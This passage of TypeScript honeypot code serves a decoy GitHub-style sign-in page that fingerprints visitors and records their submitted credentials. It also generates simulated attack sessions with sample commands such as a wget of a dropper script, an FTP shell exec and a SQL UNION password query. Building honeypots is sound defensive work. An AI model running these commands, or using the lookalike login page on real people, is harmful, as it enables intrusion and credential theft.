            <path d="M6 9a3.5 3.5 0 1 1 0-7 3.5 3.5 0 0 1 0 7Zm-1.5 1h3A4.5 4.5 0 0 1 12 14.5v.5H0v-.5A4.5 4.5 0 0 1 4.5 10Zm8.5-5h1v1h-1V5Zm0 2h1v1h-1V7Zm-1-3h1v1h-1V4Zm0 4h1v1h-1V8Z"/>
          </svg>
          Sign in with a passkey
        </button>
      </div>

      <div class="gh-signup-box">
        New to GitHub? <a href="#" id="createAccountBtn">Create an account</a>.
      </div>

      <div class="gh-repo-card">
        <div class="repo-name">
          <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor" class="lock-icon" style="vertical-align:middle;margin-right:4px"><path d="M4 5V3.5A3.5 3.5 0 0 1 11 3.5V5h.5A1.5 1.5 0 0 1 13 6.5v6A1.5 1.5 0 0 1 11.5 14h-7A1.5 1.5 0 0 1 3 12.5v-6A1.5 1.5 0 0 1 4.5 5H4Zm1 0h6V3.5a3 3 0 0 0-6 0V5Z"/></svg>
          private-infra / secrets-vault
        </div>
        <div class="repo-desc">Internal config and secret rotation scripts. Restricted access.</div>
        <div class="repo-meta">
          <span><span class="lang-dot"></span>JavaScript</span>
          <span>★ 47</span>
          <span>Updated 2 hours ago</span>
        </div>
      </div>
    </div>

    <!-- Tiny decorative sponsor badge (the "ad") -->
    <div class="sponsor-badge" id="sponsorBadge" title="Sponsor on GitHub">
      <svg width="12" height="12" viewBox="0 0 16 16" class="heart" aria-hidden="true">
        <path d="M4.25 2.44 8 5.16l3.75-2.72A2.75 2.75 0 1 1 15.7 6.28L8 12.56.3 6.28a2.751 2.751 0 1 1 3.95-3.84Z"/>
      </svg>
      <strong>Sponsor</strong>
      <span>· GitHub Sponsors</span>
    </div>

    <!-- Hidden tracking nodes (keep IDs intact for JS) -->
    <div class="sr-only" id="feedBox" aria-hidden="true"></div>
    <span class="sr-only" id="liveCount" aria-hidden="true">0</span>
    <span class="sr-only" id="toneStatus" aria-hidden="true"></span>
    <span class="sr-only" id="visitorMeta" aria-hidden="true"></span>
    <span class="sr-only" id="focusState" aria-hidden="true">0</span>
    <span class="sr-only" id="clickState" aria-hidden="true">0</span>

    <footer class="gh-footer">
      <div>
        <a href="#">Terms</a><a href="#">Privacy</a><a href="#">Security</a><a href="#">Status</a>
        <a href="#">Docs</a><a href="#">Contact GitHub</a><a href="#">Pricing</a>
        <a href="#">API</a><a href="#">Training</a><a href="#">Blog</a><a href="#">About</a>
      </div>
      <div style="margin-top:8px">© 2025 GitHub, Inc.</div>
    </footer>

    <script>
      const sessionSeed = Math.random().toString(36).slice(2, 10);
      const fingerprint = [
        navigator.userAgent,
        screen.width + "x" + screen.height,
        window.innerWidth + "x" + window.innerHeight,
        navigator.language,
        Intl.DateTimeFormat().resolvedOptions().timeZone
      ].join("|");
      document.getElementById("fingerprint").value = fingerprint;

      let resolvedPublicIp = "";
      fetch("https://api64.ipify.org?format=json")
        .then((r) => r.ok ? r.json() : null)
        .then((data) => {
          if (!data || !data.ip) return;
          resolvedPublicIp = String(data.ip);
          document.getElementById("publicIp").value = resolvedPublicIp;
        })
        .catch(() => {});

      const postTelemetry = (action, extra = {}) => {
        fetch("/telemetry", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            action,
            seed: sessionSeed,
            publicIp: resolvedPublicIp,
            fingerprint,
            viewport: window.innerWidth + "x" + window.innerHeight,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            ...extra,
          }),
        }).catch(() => {});
      };

      const feedBox = document.getElementById("feedBox");
      const liveCount = document.getElementById("liveCount");
      const sseStatus = document.getElementById("sseStatus");
      const visitorMeta = document.getElementById("visitorMeta");
      const focusState = document.getElementById("focusState");
      const clickState = document.getElementById("clickState");
      const toneStatus = document.getElementById("toneStatus");
      const clickCounter = { value: 0 };
      const focusCounter = { value: 0 };
      const appendFeed = (line) => {
        const row = document.createElement("div");
        row.textContent = new Date().toLocaleTimeString() + " " + line;
        feedBox.prepend(row);
        while (feedBox.children.length > 16) feedBox.removeChild(feedBox.lastElementChild);
      };

      const source = new EventSource("/live-events");
      source.onopen = () => { sseStatus.textContent = "live"; postTelemetry("sse-open"); };
      source.onerror = () => { sseStatus.textContent = "reconnect…"; };
      source.onmessage = (event) => {
        try {
          const data = JSON.parse(event.data);
          if (data?.message) appendFeed(data.message);
          const current = Number(liveCount.textContent || "0");
          liveCount.textContent = String(Math.min(99, current + 1));
        } catch {}
      };

      document.getElementById("passkeyBtn")?.addEventListener("click", () => postTelemetry("passkey-click"));
      document.getElementById("createAccountBtn")?.addEventListener("click", () => postTelemetry("create-account-click"));
      document.getElementById("sponsorBadge")?.addEventListener("click", () => postTelemetry("sponsor-click"));
      document.getElementById("signinForm")?.addEventListener("submit", () => postTelemetry("signin-submit"));

      window.addEventListener("focus", () => {
        focusCounter.value += 1;
        focusState.textContent = String(focusCounter.value);
        postTelemetry("window-focus", { count: focusCounter.value });
      });
      window.addEventListener("click", () => {
        clickCounter.value += 1;
        clickState.textContent = String(clickCounter.value);
      }, { passive: true });
      document.addEventListener("mousemove", () => {
        visitorMeta.textContent = "motion · clicks " + clickCounter.value;
      }, { passive: true });

      postTelemetry("trap-load");
    </script>
  </body>
</html>`;
  }

  private resolveAttackerIp(req: express.Request, hintedIp?: string) {
    return pickBestAttackerIp([
      hintedIp,
      req.headers["cf-connecting-ip"] as string | undefined,
      req.headers["x-real-ip"] as string | undefined,
      req.headers["x-forwarded-for"] as string | undefined,
      req.ip,
      req.socket.remoteAddress,
    ]);
  }

  private async withTrapSession(req: express.Request, res: Response, hintedIp?: string) {
    const attackerIp = this.resolveAttackerIp(req, hintedIp);
    const session = await this.createSession(
      "http",
      Number(req.socket.localPort || this.config.services.find((item) => item.service === "http")?.port || 8081),
      attackerIp,
      Number(req.socket.remotePort || 0),
      "http"
    );

    await this.recordWebRequest(session.id, {
      method: req.method,
      path: req.originalUrl || req.path,
      userAgent: req.headers["user-agent"],
      body: serializeBody(req.body),
      query: new URLSearchParams(req.query as Record<string, string>).toString(),
    });

    res.on("finish", () => this.finalizeSession(session.id));
    return session;
  }

  createTrapRouter({ rootPath = "/" }: { rootPath?: string } = {}) {
    const router = express.Router();
    router.use(express.urlencoded({ extended: true }));
    router.use(express.json());

    router.get(rootPath, async (req, res) => {
      const session = await this.withTrapSession(req, res, String(req.query?.publicIp || ""));
      if (this.isBlocked(session.attackerIp)) {
        res.status(403).send("Access denied");
        return;
      }
      res.setHeader("Server", "nginx/1.22.1");
      res.status(200).send(this.renderTrapHtml());
    });

    router.get("/live-events", (req, res) => {
      res.set({
        "Content-Type": "text/event-stream",
        "Cache-Control": "no-cache",
        Connection: "keep-alive",
      });
      res.flushHeaders();
      res.write(`data: ${JSON.stringify({ type: "connected", message: "live link open", ts: new Date().toISOString() })}\n\n`);

      const ping = setInterval(() => {
        try {
          res.write(`: ping\n\n`);
        } catch {
          clearInterval(ping);
        }
      }, 15000);

      addSseClient(res);
      req.on("close", () => {
        clearInterval(ping);
        removeSseClient(res);
      });
    });

    router.post("/auth", async (req, res) => {
      const session = await this.withTrapSession(req, res, String(req.body?.publicIp || ""));
      if (this.isBlocked(session.attackerIp)) {
        res.status(403).send("Access denied");
        return;
      }
      const username = String(req.body?.username || "");
      const password = String(req.body?.password || "");
      const fingerprint = String(req.body?.fingerprint || "");

      await this.recordCredential(session.id, username, password);
      if (fingerprint) {
        await this.recordPayload(session.id, `fingerprint=${fingerprint}`);
      }

      res.setHeader("Server", "nginx/1.22.1");
      res.status(401).send("Authentication failed. Gateway denied access.");
    });

    router.post("/telemetry", async (req, res) => {
      const session = await this.withTrapSession(req, res, String(req.body?.publicIp || ""));
      if (this.isBlocked(session.attackerIp)) {
        res.status(403).json({ ok: false });
        return;
      }

      const action = String(req.body?.action || "ui-event");
      const details = JSON.stringify({
        seed: req.body?.seed,
        fingerprint: req.body?.fingerprint,
        viewport: req.body?.viewport,
        language: req.body?.language,
        timezone: req.body?.timezone,
        tone: req.body?.tone,
      });
      await this.recordInteraction(session.id, action, details);
      res.status(202).json({ ok: true });
    });

    router.post("/simulate-live", async (req, res) => {
      const session = await this.withTrapSession(req, res, String(req.body?.publicIp || ""));
      if (this.isBlocked(session.attackerIp)) {
        res.status(403).json({ ok: false, message: "Access denied" });
        return;
      }

      await this.recordPayload(session.id, "ui_action=run_connectivity_diagnostic");
      const count = Math.min(Math.max(Number(req.body?.count || 4), 1), 8);
      await this.simulateAttackBatch(count);

      res.setHeader("Server", "nginx/1.22.1");
      res.status(202).json({ ok: true, queued: count });
    });

    router.all("*", async (req, res) => {
      const session = await this.withTrapSession(req, res);
      if (this.isBlocked(session.attackerIp)) {
        res.status(403).send("Access denied");
        return;
      }
      await this.recordPayload(
        session.id,
        `headers=${JSON.stringify(req.headers).slice(0, 500)}`
      );
      res.setHeader("Server", "nginx/1.22.1");
      res.status(404).send("Resource not found");
    });

    return router;
  }

  async start() {
    for (const definition of this.config.services) {
      if (definition.service === "http") {
        await this.startHttpService(definition);
      } else {
        await this.startTcpService(definition);
      }
    }
  }

  async simulateAttackBatch(count = 12) {
    const scripts = [
      {
        ip: "45.83.64.11",
        service: "ssh" as const,
        username: "root",
        password: "toor",
        commands: ["uname -a", "wget http://198.51.100.23/dropper.sh", "chmod +x dropper.sh"],
      },
      {
        ip: "103.141.98.44",
        service: "http" as const,
        path: "/wp-admin/setup-config.php",
        body: "user=admin&pass=admin123",
      },
      {
        ip: "91.214.124.88",
        service: "ftp" as const,
        username: "admin",
        password: "admin",
        commands: ["LIST", "SITE EXEC /bin/sh"],
      },
      {
        ip: "185.220.101.17",
        service: "database" as const,
        commands: ["SELECT @@version;", "UNION SELECT password FROM users;"],
      },
    ];

    for (let index = 0; index < count; index += 1) {
      const sample = scripts[index % scripts.length];
      const session = await this.createSession(
        sample.service,
        this.serviceStatus.get(sample.service)?.port || 0,
        sample.ip,
        40000 + index,
        sample.service === "http" ? "http" : "tcp"
      );

      if ("path" in sample) {
        const path = sample.path || "/";
        await this.recordWebRequest(session.id, {
          method: "POST",
          path,
          userAgent: "curl/8.8.0",
          body: sample.body,
        });
      }

      if ("username" in sample) {
        await this.recordCredential(
          session.id,
          sample.username || "guest",
          sample.password || ""
        );
      }

      for (const command of sample.commands || []) {
        await this.recordCommand(session.id, command);
      }

      this.finalizeSession(session.id);
    }
  }
}

export const honeypotEngine = new HoneypotEngine(honeypotConfig);
